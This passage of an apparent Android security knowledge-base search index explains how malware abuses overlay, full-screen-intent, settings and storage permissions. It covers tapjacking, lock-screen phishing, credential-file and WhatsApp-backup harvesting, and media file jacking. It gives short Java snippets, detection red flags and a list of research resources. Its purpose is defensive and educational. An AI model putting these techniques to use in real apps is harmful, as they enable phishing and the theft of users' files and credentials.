demand.</p>"},{"location":"permissions/special/system-alert-window/#tapjacking","title":"Tapjacking","text":"<p>A transparent overlay captures touch events, or an overlay briefly appears to trick the user into tapping a specific location on a dialog behind it (e.g., a permission grant dialog).</p>"},{"location":"permissions/special/system-alert-window/#blocking-ui","title":"Blocking UI","text":"<p>Overlay covering the entire screen, preventing user from navigating to Settings to uninstall or revoke permissions.</p>"},{"location":"permissions/special/system-alert-window/#notable-families","title":"Notable Families","text":"Family Overlay Usage BankBot Pioneered overlay-based credential theft on Android Cerberus HTML injection overlays for 200+ banking apps Anubis Overlay + keylogger combination Ermac Overlay kit with frequently updated target list Hydra Overlay-based phishing with WebView injection TsarBot Overlay attacks targeting 750+ banking and crypto apps Antidot Overlay injection with multilingual phishing templates Brokewell Overlay-based credential capture with screen streaming Klopatra Overlay phishing for banking credential theft Albiriox Overlay attacks with dynamic target list from C2 Herodotus WebView overlay injection for banking apps BingoMod Overlay phishing combined with on-device fraud Crocodilus Overlay-driven credential theft with accessibility abuse BTMOB RAT Overlay attacks paired with screen streaming capabilities"},{"location":"permissions/special/system-alert-window/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): moved from install-time to special permission. Google Play apps with this permission were auto-granted until Android 8.</p> <p>Android 7.1: <code>TYPE_TOAST</code> windows still usable without the permission.</p> <p>Android 8.0 (API 26): <code>TYPE_TOAST</code> exploit patched. Deprecated <code>TYPE_PHONE</code>, <code>TYPE_SYSTEM_ALERT</code>. Added <code>TYPE_APPLICATION_OVERLAY</code>, which renders below critical system windows (permission dialogs), partially mitigating tapjacking.</p> <p>Android 10 (API 29): overlays cannot appear on top of other app activities if the overlay app doesn't have focus.</p> <p>Android 12 (API 31): overlays become untouchable by default when shown over sensitive system dialogs. System adds <code>FLAG_WINDOW_IS_PARTIALLY_OBSCURED</code> to notify apps.</p> <p>Post-Android 12, apps using accessibility can bypass overlay restrictions by performing gestures directly, making <code>BIND_ACCESSIBILITY_SERVICE</code> the more potent path.</p>"},{"location":"permissions/special/system-alert-window/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\" /&gt;\n</code></pre> <p>In code, look for:</p> <pre><code>WindowManager.LayoutParams params = new WindowManager.LayoutParams(\n    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,\n    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,\n    PixelFormat.TRANSLUCENT\n);\nwindowManager.addView(overlayView, params);\n</code></pre> <p>Red flags: <code>TYPE_APPLICATION_OVERLAY</code> combined with <code>UsageStatsManager.queryUsageStats()</code> (foreground app detection) or accessibility event monitoring.</p>"},{"location":"permissions/special/use-full-screen-intent/","title":"USE_FULL_SCREEN_INTENT","text":"<p>Allows launching a full-screen activity from a notification when the device is locked. Designed for alarm clocks and incoming calls, but abused by malware to display phishing screens or social engineering prompts on locked devices.</p>"},{"location":"permissions/special/use-full-screen-intent/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.USE_FULL_SCREEN_INTENT</code> Protection Level <code>normal</code> (API 29-33), <code>special</code> (API 34+) Grant Method Automatic (API 29-33), Settings toggle (API 34+) Introduced API 29 (Android 10)"},{"location":"permissions/special/use-full-screen-intent/#what-it-enables","title":"What It Enables","text":"<p>A notification with a full-screen intent launches an activity that appears over the lock screen:</p> <pre><code>Intent fullScreenIntent = new Intent(this, PhishingActivity.class);\nPendingIntent fullScreenPendingIntent = PendingIntent.getActivity(this, 0,\n    fullScreenIntent, PendingIntent.FLAG_IMMUTABLE);\n\nNotification notification = new NotificationCompat.Builder(this, CHANNEL_ID)\n    .setFullScreenIntent(fullScreenPendingIntent, true)\n    .build();\n</code></pre> <p>When the notification fires and the device is locked, the activity appears immediately over the lock screen without the user unlocking.</p>"},{"location":"permissions/special/use-full-screen-intent/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/use-full-screen-intent/#lock-screen-phishing","title":"Lock Screen Phishing","text":"<p>Display a fake login screen, system alert, or security warning while the device is locked. The user wakes their device and sees a convincing prompt before reaching their home screen.</p>"},{"location":"permissions/special/use-full-screen-intent/#social-engineering","title":"Social Engineering","text":"<p>Show \"urgent security update\" or \"account compromised\" messages that prompt the user to enter credentials or enable accessibility.</p>"},{"location":"permissions/special/use-full-screen-intent/#distraction-screen","title":"Distraction Screen","text":"<p>Display a fake \"updating\" or \"loading\" screen over the lock screen while the malware performs on-device fraud in the background.</p>"},{"location":"permissions/special/use-full-screen-intent/#android-version-changes","title":"Android Version Changes","text":"<p>Android 10 (API 29): permission introduced as <code>normal</code> (auto-granted).</p> <p>Android 14 (API 34): changed to a special permission requiring explicit user grant. Apps targeting API 34+ must request through Settings. Existing apps keep their grant until they update targetSdkVersion.</p>"},{"location":"permissions/special/use-full-screen-intent/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.USE_FULL_SCREEN_INTENT\" /&gt;\n</code></pre> <p>Look for <code>setFullScreenIntent()</code> calls in notification builders. Any app that isn't an alarm, timer, or communication app using this is suspicious.</p>"},{"location":"permissions/special/write-settings/","title":"WRITE_SETTINGS","text":"<p>Allows modifying system-level settings. Can change default ringtone, screen brightness, screen timeout, and other global settings. Less commonly abused than other special permissions, but can be used to weaken device security or annoy the user into performing actions.</p>"},{"location":"permissions/special/write-settings/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WRITE_SETTINGS</code> Protection Level <code>signature\\|appop\\|pre23\\|preinstalled</code> Grant Method Settings &gt; Apps &gt; Special access &gt; Modify system settings Introduced API 1 <p>Before Android 6.0, this was a normal permission. Since API 23, it requires a Settings toggle.</p>"},{"location":"permissions/special/write-settings/#what-it-enables","title":"What It Enables","text":"<p>Modify values in <code>Settings.System</code>:</p> <pre><code>Settings.System.putInt(getContentResolver(),\n    Settings.System.SCREEN_OFF_TIMEOUT, 2147483647); // prevent screen off\n</code></pre> <p>Accessible settings include:</p> Setting Impact <code>SCREEN_OFF_TIMEOUT</code> Prevent screen from turning off (keep screen on for overlay display) <code>SCREEN_BRIGHTNESS</code> Change brightness <code>SOUND_EFFECTS_ENABLED</code> Disable/enable sound effects <code>RINGTONE</code> Change ringtone <code>AIRPLANE_MODE_ON</code> Toggle airplane mode (limited on newer Android)"},{"location":"permissions/special/write-settings/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/special/write-settings/#preventing-screen-lock","title":"Preventing Screen Lock","text":"<p>Set <code>SCREEN_OFF_TIMEOUT</code> to maximum value to keep the screen on while performing on-device fraud or displaying overlays.</p>"},{"location":"permissions/special/write-settings/#disabling-security","title":"Disabling Security","text":"<p>On older Android versions, some security-related settings were writable. Modern Android moved most sensitive settings to <code>Settings.Global</code> and <code>Settings.Secure</code>, which require higher privileges.</p>"},{"location":"permissions/special/write-settings/#android-version-changes","title":"Android Version Changes","text":"<p>Android 6.0 (API 23): moved to special permission.</p> <p>Android 7.0+: <code>AIRPLANE_MODE_ON</code> moved to <code>Settings.Global</code>, no longer writable by apps.</p> <p>Most useful system settings have been progressively locked down, reducing the attack surface of this permission.</p>"},{"location":"permissions/special/write-settings/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WRITE_SETTINGS\" /&gt;\n</code></pre> <p>Low priority indicator on its own. Most abuse scenarios require combination with other permissions.</p>"},{"location":"permissions/storage/","title":"Storage Permissions","text":"<p>Android's storage permission model has undergone more changes than any other permission group. The progression from unrestricted shared storage access to scoped storage to granular media permissions reflects repeated attempts to contain data theft and cross-app file access. Each transition introduced new restrictions and new bypass opportunities.</p>"},{"location":"permissions/storage/#permission-evolution","title":"Permission Evolution","text":"API Level Android Version Model 1-28 1.0 - 9.0 <code>READ/WRITE_EXTERNAL_STORAGE</code> grants full <code>/sdcard/</code> access 29 10 Scoped storage introduced, opt-out via <code>requestLegacyExternalStorage</code> 30 11 Scoped storage enforced, <code>MANAGE_EXTERNAL_STORAGE</code> added as escape hatch 33 13 <code>READ_EXTERNAL_STORAGE</code> deprecated, replaced by granular media permissions"},{"location":"permissions/storage/#permissions","title":"Permissions","text":"Permission Status Abuse Potential READ_EXTERNAL_STORAGE Deprecated API 33 Read all files on shared storage (photos, documents, app data) WRITE_EXTERNAL_STORAGE Deprecated API 30 Write files to shared storage, drop payloads, replace files READ_MEDIA_IMAGES API 33+ Access photos and screenshots READ_MEDIA_VIDEO API 33+ Access video files READ_MEDIA_AUDIO API 33+ Access audio files <p>For unrestricted file access on Android 11+, see MANAGE_EXTERNAL_STORAGE.</p>"},{"location":"permissions/storage/#offensive-relevance","title":"Offensive Relevance","text":"<p>Storage permissions are central to two attack patterns: data theft and payload delivery.</p>"},{"location":"permissions/storage/#data-theft","title":"Data Theft","text":"<p>Shared storage historically held everything users cared about: photos, downloads, documents, and critically, data from other apps that stored files externally. WhatsApp databases, Telegram media, browser downloads, and PDF documents were all accessible to any app with <code>READ_EXTERNAL_STORAGE</code>.</p>"},{"location":"permissions/storage/#payload-dropping","title":"Payload Dropping","text":"<p>Write access to shared storage enables dropping malicious APKs, DEX files, or native libraries to known paths. Combined with social engineering (\"Please install this update\") or <code>REQUEST_INSTALL_PACKAGES</code>, this provides a sideloading pipeline.</p>"},{"location":"permissions/storage/#media-file-jacking","title":"Media File Jacking","text":"<p>Before scoped storage, a malicious app could monitor shared storage and replace files written by other apps between the time they were written and when the user opened them. This was demonstrated against WhatsApp and Telegram media files.</p>"},{"location":"permissions/storage/#scoped-storage-bypass-techniques","title":"Scoped Storage Bypass Techniques","text":"<p>Malware targeting newer Android versions uses several strategies:</p> Technique How It Works <code>requestLegacyExternalStorage</code> Opt out of scoped storage on API 29 (only works for apps targeting API 29) <code>MANAGE_EXTERNAL_STORAGE</code> Full file access on API 30+, requires special permission grant <code>MediaStore</code> API abuse Access media files through MediaStore without broad storage permission SAF (Storage Access Framework) Trick user into granting directory access via document picker <code>preserveLegacyExternalStorage</code> Maintain pre-existing storage access on upgrade to API 30 Target API downgrade Target API 28 or lower to avoid scoped storage entirely"},{"location":"permissions/storage/read-external-storage/","title":"READ_EXTERNAL_STORAGE","text":"<p>Grants read access to files on shared/external storage (<code>/sdcard/</code>). Before scoped storage, this was a skeleton key to every file on the device's shared storage: photos, documents, downloads, WhatsApp databases, and any other app data stored externally. Deprecated in Android 13 in favor of granular media permissions (<code>READ_MEDIA_IMAGES</code>, <code>READ_MEDIA_VIDEO</code>, <code>READ_MEDIA_AUDIO</code>).</p>"},{"location":"permissions/storage/read-external-storage/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_EXTERNAL_STORAGE</code> Protection Level <code>dangerous</code> Permission Group <code>STORAGE</code> Grant Method Runtime permission dialog Introduced API 16 Deprecated API 33 (Android 13) Max Target SDK Effect API 32 (ignored if targeting API 33+)"},{"location":"permissions/storage/read-external-storage/#what-it-enables","title":"What It Enables","text":"<p>On devices running Android 9 and below (or apps targeting API 28 and below), this permission grants read access to the entire <code>/sdcard/</code> directory tree:</p> <pre><code>/sdcard/\n\u251c\u2500\u2500 DCIM/           # Photos and camera output\n\u251c\u2500\u2500 Download/       # Browser and app downloads\n\u251c\u2500\u2500 Documents/      # User documents\n\u251c\u2500\u2500 Pictures/       # Screenshots, saved images\n\u251c\u2500\u2500 WhatsApp/       # WhatsApp media and databases\n\u2502   \u251c\u2500\u2500 Databases/  # Encrypted chat backups\n\u2502   \u2514\u2500\u2500 Media/      # Shared photos, videos, voice notes\n\u251c\u2500\u2500 Telegram/       # Telegram downloads\n\u251c\u2500\u2500 Android/data/   # Other apps' external files (pre-API 30)\n\u2514\u2500\u2500 ...\n</code></pre> <p>On Android 10-12 with scoped storage active, the permission is limited to media files accessible through <code>MediaStore</code>. On Android 13+, it has no effect for apps targeting API 33.</p>"},{"location":"permissions/storage/read-external-storage/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/storage/read-external-storage/#photo-and-document-theft","title":"Photo and Document Theft","text":"<p>The most straightforward abuse. Malware recursively enumerates shared storage and exfiltrates files matching target extensions:</p> Target Path / Extension Photos <code>DCIM/</code>, <code>Pictures/</code>, <code>.jpg</code>, <code>.png</code> Documents <code>Documents/</code>, <code>Download/</code>, <code>.pdf</code>, <code>.docx</code>, <code>.xlsx</code> Screenshots <code>Pictures/Screenshots/</code> Recordings <code>Recordings/</code>, <code>.m4a</code>, <code>.3gp</code> <p>Screenshots are particularly valuable because they may contain sensitive information: banking screens, authentication codes, private messages.</p>"},{"location":"permissions/storage/read-external-storage/#notable-families","title":"Notable Families","text":"Family Storage Abuse Rafel RAT SD card wipe capability, external storage enumeration and file exfiltration LightSpy Dedicated file manager plugin for browsing and exfiltrating external storage GuardZoo Targets military mapping files (KMZ, WPT, KML) from armed forces personnel AridSpy Document theft from external storage in targeted espionage campaigns"},{"location":"permissions/storage/read-external-storage/#whatsapp-database-extraction","title":"WhatsApp Database Extraction","text":"<p>WhatsApp stores encrypted chat database backups at <code>/sdcard/WhatsApp/Databases/msgstore.db.crypt14</code>. With <code>READ_EXTERNAL_STORAGE</code>, malware can copy this file. While the database is encrypted, the key can be extracted from the app's private storage with root access, or the backup can be decrypted using the user's Google account backup key.</p> <p>Families known to target WhatsApp data:</p> Family WhatsApp Targeting GravityRAT Exfiltrates WhatsApp backup databases Dracarys Steals WhatsApp media and documents RatMilad Targets WhatsApp and Telegram data directories PhoneSpy Harvests all media including WhatsApp images"},{"location":"permissions/storage/read-external-storage/#credential-file-harvesting","title":"Credential File Harvesting","text":"<p>Some apps store credentials, tokens, or configuration files on external storage (a developer mistake, but common). Malware scans for:</p> <ul> <li><code>.json</code> files containing API keys or tokens</li> <li><code>.pem</code> / <code>.key</code> files (certificates and private keys)</li> <li>Browser download folders for saved credential exports</li> <li>Password manager exports (CSV/JSON)</li> </ul>"},{"location":"permissions/storage/read-external-storage/#reconnaissance","title":"Reconnaissance","text":"<p>Enumerating the file system reveals installed apps (by checking <code>Android/data/</code> subdirectories), user habits (photo metadata with GPS coordinates), and organizational context (document filenames and contents).</p>"},{"location":"permissions/storage/read-external-storage/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4 (API 19): prior to this, <code>READ_EXTERNAL_STORAGE</code> was not enforced. Any app could read external storage without declaring the permission.</p> <p>Android 6.0 (API 23): became a runtime permission. Granting <code>READ_EXTERNAL_STORAGE</code> also granted <code>WRITE_EXTERNAL_STORAGE</code> (same permission group). This was tightened in later versions.</p> <p>Android 10 (API 29): scoped storage introduced. Apps targeting API 29 are restricted to their own external directory and <code>MediaStore</code>-accessible media. The <code>requestLegacyExternalStorage=\"true\"</code> manifest flag opts out.</p> <p>Android 11 (API 30): scoped storage enforced. The legacy opt-out flag is ignored for apps targeting API 30+. <code>READ_EXTERNAL_STORAGE</code> only grants <code>MediaStore</code> access to media files (images, video, audio), not arbitrary files.</p> <p>Android 13 (API 33): <code>READ_EXTERNAL_STORAGE</code> deprecated. Apps targeting API 33+ must use <code>READ_MEDIA_IMAGES</code>, <code>READ_MEDIA_VIDEO</code>, or <code>READ_MEDIA_AUDIO</code> instead. The old permission is silently ignored.</p>"},{"location":"permissions/storage/read-external-storage/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;\n</code></pre> <p>Red flags:</p> <ul> <li>Combined with <code>INTERNET</code> and no clear media-display UI: likely exfiltration</li> <li>Recursive file enumeration in decompiled code (<code>File.listFiles()</code>, <code>File.walk()</code>)</li> <li>Hardcoded paths to WhatsApp, Telegram, or other app directories</li> <li>File extension filtering targeting documents and databases</li> <li>Apps targeting API 28 or lower on devices running Android 10+ (intentionally avoiding scoped storage)</li> <li><code>requestLegacyExternalStorage=\"true\"</code> in the application tag (opting out of scoped storage on API 29)</li> </ul>"},{"location":"permissions/storage/read-media-audio/","title":"READ_MEDIA_AUDIO","text":"<p>Allows reading audio files (music, voice recordings, podcasts) from shared storage via <code>MediaStore</code>. Granular media permission introduced in Android 13.</p>"},{"location":"permissions/storage/read-media-audio/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_MEDIA_AUDIO</code> Protection Level <code>dangerous</code> Permission Group <code>READ_MEDIA_AURAL</code> Grant Method Runtime permission dialog Introduced API 33 (Android 13)"},{"location":"permissions/storage/read-media-audio/#what-it-enables","title":"What It Enables","text":"<p>Query <code>MediaStore.Audio</code> for all audio files on the device.</p>"},{"location":"permissions/storage/read-media-audio/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/storage/read-media-audio/#voice-recording-exfiltration","title":"Voice Recording Exfiltration","text":"<p>Users may have voice recordings (meetings, notes, interviews) stored on their device. These can contain sensitive information.</p>"},{"location":"permissions/storage/read-media-audio/#call-recording-access","title":"Call Recording Access","text":"<p>Third-party call recording apps store recordings as audio files in shared storage. Accessible through this permission.</p>"},{"location":"permissions/storage/read-media-audio/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_MEDIA_AUDIO\" /&gt;\n</code></pre> <p>Expected in music players, podcast apps, and voice recording apps.</p>"},{"location":"permissions/storage/read-media-images/","title":"READ_MEDIA_IMAGES","text":"<p>Allows reading image files (photos, screenshots) from shared storage via <code>MediaStore</code>. Introduced in Android 13 as a granular replacement for <code>READ_EXTERNAL_STORAGE</code>, giving users control over which media types an app can access.</p>"},{"location":"permissions/storage/read-media-images/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_MEDIA_IMAGES</code> Protection Level <code>dangerous</code> Permission Group <code>READ_MEDIA_VISUAL</code> (Android 14+) Grant Method Runtime permission dialog Introduced API 33 (Android 13)"},{"location":"permissions/storage/read-media-images/#what-it-enables","title":"What It Enables","text":"<p>Query <code>MediaStore.Images</code> for all photos and screenshots on the device. Includes EXIF metadata (GPS coordinates, camera model, timestamps).</p>"},{"location":"permissions/storage/read-media-images/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/storage/read-media-images/#photo-exfiltration","title":"Photo Exfiltration","text":"<p>Steal personal photos for blackmail, identity theft, or intelligence gathering. Screenshots may contain sensitive information (banking app screens, private messages, authentication codes).</p>"},{"location":"permissions/storage/read-media-images/#exif-location-data","title":"EXIF Location Data","text":"<p>Photos contain GPS coordinates in EXIF metadata, revealing where and when they were taken, even without location permission.</p>"},{"location":"permissions/storage/read-media-images/#document-theft-via-screenshots","title":"Document Theft via Screenshots","text":"<p>Users often screenshot sensitive documents, banking details, and passwords. These are accessible through this permission.</p>"},{"location":"permissions/storage/read-media-images/#android-version-changes","title":"Android Version Changes","text":"<p>Android 13 (API 33): introduced as replacement for <code>READ_EXTERNAL_STORAGE</code> for media access.</p> <p>Android 14 (API 34): users can grant partial access (select specific photos) instead of full access. The app may not see all images.</p>"},{"location":"permissions/storage/read-media-images/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_MEDIA_IMAGES\" /&gt;\n</code></pre>"},{"location":"permissions/storage/read-media-video/","title":"READ_MEDIA_VIDEO","text":"<p>Allows reading video files from shared storage via <code>MediaStore</code>. Granular media permission introduced in Android 13.</p>"},{"location":"permissions/storage/read-media-video/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_MEDIA_VIDEO</code> Protection Level <code>dangerous</code> Permission Group <code>READ_MEDIA_VISUAL</code> (Android 14+) Grant Method Runtime permission dialog Introduced API 33 (Android 13)"},{"location":"permissions/storage/read-media-video/#what-it-enables","title":"What It Enables","text":"<p>Query <code>MediaStore.Video</code> for all video files on the device. Includes metadata (duration, resolution, GPS coordinates, timestamps).</p>"},{"location":"permissions/storage/read-media-video/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/storage/read-media-video/#video-exfiltration","title":"Video Exfiltration","text":"<p>Steal personal videos for blackmail. Screen recordings may contain sensitive application usage.</p>"},{"location":"permissions/storage/read-media-video/#large-file-exfiltration","title":"Large File Exfiltration","text":"<p>Videos are large files. Exfiltrating them requires significant bandwidth, making this less practical for high-volume operations but valuable for targeted surveillance.</p>"},{"location":"permissions/storage/read-media-video/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_MEDIA_VIDEO\" /&gt;\n</code></pre> <p>On Android 14+, grouped with <code>READ_MEDIA_IMAGES</code> in the <code>READ_MEDIA_VISUAL</code> permission group. Granting one grants the other.</p>"},{"location":"permissions/storage/write-external-storage/","title":"WRITE_EXTERNAL_STORAGE","text":"<p>Grants write access to shared/external storage (<code>/sdcard/</code>). Enables creating, modifying, and deleting files on the device's shared storage. Used by malware for payload dropping, file replacement attacks, and staging exfiltration data. Functionally deprecated in Android 11 with scoped storage enforcement.</p>"},{"location":"permissions/storage/write-external-storage/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WRITE_EXTERNAL_STORAGE</code> Protection Level <code>dangerous</code> Permission Group <code>STORAGE</code> Grant Method Runtime permission dialog Introduced API 4 Deprecated API 29 (Android 10) Max Target SDK Effect API 29 (no effect for apps targeting API 30+)"},{"location":"permissions/storage/write-external-storage/#what-it-enables","title":"What It Enables","text":"<p>On Android 9 and below, full write access to the entire <code>/sdcard/</code> directory tree. The app can create, modify, and delete any file on shared storage.</p> <p>On Android 10 (API 29) targeting API 29, the permission still works if the app sets <code>requestLegacyExternalStorage=\"true\"</code>. Without this flag, the app is limited to its own scoped directory.</p> <p>On Android 11+ (API 30+), <code>WRITE_EXTERNAL_STORAGE</code> has no effect regardless of target SDK. Apps can only write to:</p> <ul> <li>Their own app-specific external directory (<code>Android/data/&lt;package&gt;/</code>)</li> <li><code>MediaStore</code> entries they created</li> <li>Locations granted via SAF (Storage Access Framework)</li> </ul> <p>Historically, granting <code>WRITE_EXTERNAL_STORAGE</code> implicitly granted <code>READ_EXTERNAL_STORAGE</code> as well, since they were in the same permission group.</p>"},{"location":"permissions/storage/write-external-storage/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/storage/write-external-storage/#payload-dropping","title":"Payload Dropping","text":"<p>Write malicious files to predictable locations for later use:</p> Payload Type Technique APK files Drop to <code>Download/</code> and prompt user to install via <code>REQUEST_INSTALL_PACKAGES</code> or social engineering DEX files Write to shared storage, load dynamically via <code>DexClassLoader</code> Native libraries (.so) Drop and load via <code>System.load()</code> with absolute path Scripts Stage shell scripts for execution via other exploit chains"},{"location":"permissions/storage/write-external-storage/#media-file-jacking","title":"Media File Jacking","text":"<p>Demonstrated by Symantec in 2019 against WhatsApp and Telegram. The attack works by monitoring shared storage with a <code>FileObserver</code> and replacing media files between the time they are written and when the receiving app displays them. For example:</p> <ol> <li>WhatsApp saves an incoming image to <code>/sdcard/WhatsApp/Media/</code></li> <li>Malware detects the new file via <code>FileObserver</code></li> <li>Malware replaces the image with a modified version (altered bank account numbers in a payment screenshot, for instance)</li> <li>User sees the manipulated image in the WhatsApp chat</li> </ol> <p>This attack was viable on Android 9 and below. Scoped storage mitigated it by preventing cross-app file access.</p>"},{"location":"permissions/storage/write-external-storage/#file-replacement","title":"File Replacement","text":"<p>Beyond media jacking, write access enables replacing any file on shared storage:</p> <ul> <li>Swap legitimate APKs in the Downloads folder with trojanized versions</li> <li>Modify downloaded configuration files</li> <li>Alter documents before the user opens them</li> <li>Overwrite OTA update files if stored on external storage</li> </ul>"},{"location":"permissions/storage/write-external-storage/#staging-for-exfiltration","title":"Staging for Exfiltration","text":"<p>Some malware writes collected data (screenshots, keylog output, recorded audio) to shared storage as a staging area before exfiltration. This avoids filling app-private storage and can survive app uninstall.</p>"},{"location":"permissions/storage/write-external-storage/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4 (API 19): apps can write to their own app-specific directory on external storage (<code>Android/data/&lt;package&gt;/</code>) without <code>WRITE_EXTERNAL_STORAGE</code>. The permission is only needed for writing outside this directory.</p> <p>Android 6.0 (API 23): runtime permission required. Granting write implicitly granted read (same permission group).</p> <p>Android 10 (API 29): scoped storage introduced. <code>WRITE_EXTERNAL_STORAGE</code> deprecated. Apps targeting API 29 can opt out with <code>requestLegacyExternalStorage=\"true\"</code>.</p> <p>Android 11 (API 30): scoped storage enforced. <code>WRITE_EXTERNAL_STORAGE</code> grants no additional access for apps targeting API 30+. The permission exists in the manifest but is ignored by the system. Apps needing broad write access must use <code>MANAGE_EXTERNAL_STORAGE</code>.</p> <p>Android 13 (API 33): the permission remains in the framework for backward compatibility but is effectively dead for modern apps.</p>"},{"location":"permissions/storage/write-external-storage/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt;\n</code></pre> <p>Key indicators:</p> <ul> <li>Combined with <code>REQUEST_INSTALL_PACKAGES</code>: payload drop and sideload pipeline</li> <li><code>FileObserver</code> usage on shared storage directories: potential media file jacking</li> <li>Writing to paths outside the app's own <code>Android/data/</code> directory</li> <li><code>requestLegacyExternalStorage=\"true\"</code> in the application tag for apps targeting API 29</li> <li>Apps targeting API 28 or lower to retain full write access on modern devices</li> <li><code>DexClassLoader</code> or <code>System.load()</code> with paths pointing to shared storage: dynamic payload loading from dropped files</li> </ul>"},{"location":"resources/","title":"Resources","text":"<p>External resources for Android security research. Blogs, tools, frameworks, and link collections.</p>"},{"location":"resources/#blogs-research","title":"Blogs &amp; Research","text":""},{"location":"resources/#malware-research","title":"Malware Research","text":"Source Focus CheckPoint Research Android malware campaigns, Play Store threats, mobile APT tracking. Cleafy Labs Banking malware, financial fraud, mobile threat intelligence. Cyble CRIL Dark web intelligence, mobile malware sold on underground forums. Fortinet FortiGuard Android malware write-ups, mobile threat landscape. IBM Security Trusteer Mobile banking fraud, overlay attack research, financial malware analysis. Sophos X-Ops Cross-platform threat research including Android malware families. ThreatFabric Android banking trojans. Most prolific mobile malware research team. Trellix (FireEye) Advanced mobile threats, nation-state campaigns."},{"location":"resources/#vulnerability-research","title":"Vulnerability Research","text":"Source Focus 8kSec App and kernel-level Android security. Battlegrounds CTF. Google Android Offensive Security Kernel exploitation, Binder fuzzing, driver analysis from Google's red team. Google Project Zero 0-day research. Android exploit chains, Pixel vulnerabilities. NowSecure Blog Mobile app security testing, practical vulnerability analysis. Oversecured Blog Android app vulnerabilities. Systematic disclosure in Google, Samsung, TikTok apps. Top resource."},{"location":"resources/#vendor-security-blogs","title":"Vendor Security Blogs","text":"Source Focus Avast Decoded Android malware, adware campaign analysis. ESET WeLiveSecurity Android malware publications, regional threat analysis. Group-IB Blog Threat intelligence, fraud prevention, APT campaigns. Intel 471 Blog Underground marketplace monitoring, MaaS tracking. Kaspersky Securelist Mobile malware analysis, APT campaigns targeting Android. Lookout Threat Intelligence Mobile endpoint threats, surveillance software, state-sponsored spyware. McAfee Mobile Research Mobile malware, adware, PUPs. Part of McAfee Labs. NCC Group Research Offensive security research, Android malware lineage analysis. PRODAFT Blog Threat intelligence, underground infrastructure analysis. Trend Micro Blog Mobile ransomware, enterprise mobile threats. Zimperium Blog Mobile threat defense research, zero-day discoveries."},{"location":"resources/#platform-ecosystem","title":"Platform / Ecosystem","text":"Source Focus Android Developers Blog New API changes, security feature announcements. Android Security Bulletins Monthly CVE patches for Android. Google Security Blog Play Protect updates, platform security changes."},{"location":"resources/#frameworks-standards","title":"Frameworks &amp; Standards","text":"Resource What It Is bazaar.abuse.ch Malware sample database with multi-vendor tagging and YARA rule matching. Malpedia Malware reference database. Cross-vendor name mapping. MISP Galaxy Open threat intelligence knowledge base. Threat actors, malware families, tools, and ATT&amp;CK clusters. MITRE ATT&amp;CK Mobile Adversary technique taxonomy. High-level classification, not operational detail. OWASP MAS Mobile application security testing guide. Compliance-oriented. OWASP Mobile Top 10 Top 10 mobile security risks."},{"location":"resources/#tools","title":"Tools","text":""},{"location":"resources/#analysis-detection","title":"Analysis &amp; Detection","text":"Tool Purpose Androguard Python framework for Android app analysis APKiD Packer, protector, obfuscator identification APKLeaks Extract URLs, endpoints, and secrets from APK files dex2jar DEX to JAR conversion Droidlysis Automated Android malware property extraction (permissions, receivers, services) Drozer Android security assessment framework. IPC probing, provider testing. MobSF Automated mobile security analysis Quark Engine Android malware scoring and behavior analysis SUPER Secure, Unified, Powerful and Extensible Rust Android Analyzer VirusTotal Multi-engine malware scanning. 70+ AV engines. See Naming Conventions for detection name formats."},{"location":"resources/#device","title":"Device","text":"Tool Purpose LSPosed Xposed framework for modern Android Magisk Root management with detection bypass"},{"location":"resources/#network","title":"Network","text":"Tool Purpose Burp Suite HTTP/HTTPS proxy and traffic interception mitmproxy Scriptable HTTPS proxy"},{"location":"resources/#reverse-engineering","title":"Reverse Engineering","text":"Tool Purpose apktool APK disassembly and reassembly Bytecode Viewer Multi-decompiler view (Procyon, CFR, FernFlower, jadx side-by-side) Frida Dynamic instrumentation: hooking, tracing, modifying runtime behavior frida-dexdump Dump DEX files from packed apps at runtime Ghidra Native code reverse engineering (NSA, free) jadx DEX to Java decompiler medusa Extensible framework combining Frida scripts for Android dynamic analysis Objection Frida-powered runtime exploration reFrida Browser-based Frida IDE with Monaco editor, disassembler, memory search, Stalker tracing, and visual interceptor builder r2frida Radare2 + Frida integration radare2 Open-source reverse engineering framework"},{"location":"resources/#emulation-sandboxing","title":"Emulation &amp; Sandboxing","text":"Tool Purpose Android Emulator Official Android emulator with AVD manager Genymotion High-performance Android emulator for testing rootAVD Root Android Virtual Devices for Frida and dynamic analysis Cuckoo Droid Automated Android malware sandbox Joe Sandbox Mobile Commercial automated malware analysis sandbox"},{"location":"resources/#link-collections","title":"Link Collections","text":"Resource What It Is 